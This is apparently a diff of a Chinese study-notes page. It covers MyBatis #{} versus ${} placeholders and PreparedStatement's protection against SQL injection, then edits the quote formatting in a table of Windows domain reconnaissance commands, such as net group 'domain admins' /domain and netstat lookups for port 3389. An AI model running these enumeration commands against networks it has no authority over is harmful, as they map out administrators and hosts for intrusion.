 <p>mybatis<br><strong>Statement的几种实现</strong><br>Statement 对象用于将SQL语句发送到数据库中。<br>Statement每次执行SQL语句，数据库都要执行SQL语句的编译，最好用于仅执行一次查询并返回结果的情形<br>1、执行静态SQL语句。通常通过Statement实例实现。<br>2、执行动态SQL语句。通常通过PreparedStatement实例实现。<br>3、执行数据库存储过程。通常通过CallableStatement实例实现。</p>
 <p><strong>’和‘$’的区别</strong><br>sql 预编译指的是数据库驱动在发送 sql 语句和参数给 DBMS 之前对 sql 语句进行编译，这样 DBMS 执行 sql 时，就不需要重新编译。<br>‘#{ }’：解析为一个 JDBC 预编译语句（prepared statement）的参数标记符，一个‘ #{ }’ 被解析为一个参数占位符 ? 。<br>‘${ }’ 仅仅为一个纯粹的 string 替换，在动态 SQL 解析阶段将会进行变量替换。在预编译之前已经被变量替换了<br>‘${ }’变量的替换阶段是在动态 SQL 解析阶段，而’#{ }’变量的替换是在 DBMS 中。</p>
 <p><strong>PreparedStatement与Statement有什么区别</strong><br>1.PreparedStatement能预编译，这条预编译的SQL查询语句能在将来的查询中重用，这样一来，它比Statement对象生成的查询速度更快。<br>2.PreparedStatement可以写动态参数化的查询<br>3.PreparedStatement可以防止SQL注入式攻击<br>4.PreparedStatement查询可读性更好，追加条件的语句很乱<br>5.PreparedStatement不允许一个占位符（？）有多个值</p>
@@ -466,7 +466,7 @@ web.xml
 <td>查询主域服务器的时间</td>
 </tr>
 <tr>
-<td align="left">net group “domain controllers” /domain</td>
+<td align="left">net group &quot;domain controllers&quot; /domain</td>
 <td>查看域控制器组</td>
 </tr>
 <tr>
@@ -482,19 +482,19 @@ web.xml
 <td>查看域内用户组列表</td>
 </tr>
 <tr>
-<td align="left">net group “domain Admins” /domain</td>
+<td align="left">net group &quot;domain Admins&quot; /domain</td>
 <td>查看域管理员组</td>
 </tr>
 <tr>
-<td align="left">net group “Enterprise Admins” /domain</td>
+<td align="left">net group &quot;Enterprise Admins&quot; /domain</td>
 <td>查看企业系统管理员组</td>
 </tr>
 <tr>
-<td align="left">net group “Domain Computers” /domain</td>
+<td align="left">net group &quot;Domain Computers&quot; /domain</td>
 <td>查看所有的域成员主机</td>
 </tr>
 <tr>
-<td align="left">net group “Domain Controllers” /domain</td>
+<td align="left">net group &quot;Domain Controllers&quot; /domain</td>
 <td>查看域控制器</td>
 </tr>
 <tr>
@@ -690,7 +690,7 @@ web.xml
 <td>查看开放的端口</td>
 </tr>
 <tr>
-<td align="left">netstat -an | find “3389”</td>
+<td align="left">netstat -an | find &quot;3389&quot;</td>
 <td>找到3389端口</td>
 </tr>
 <tr>
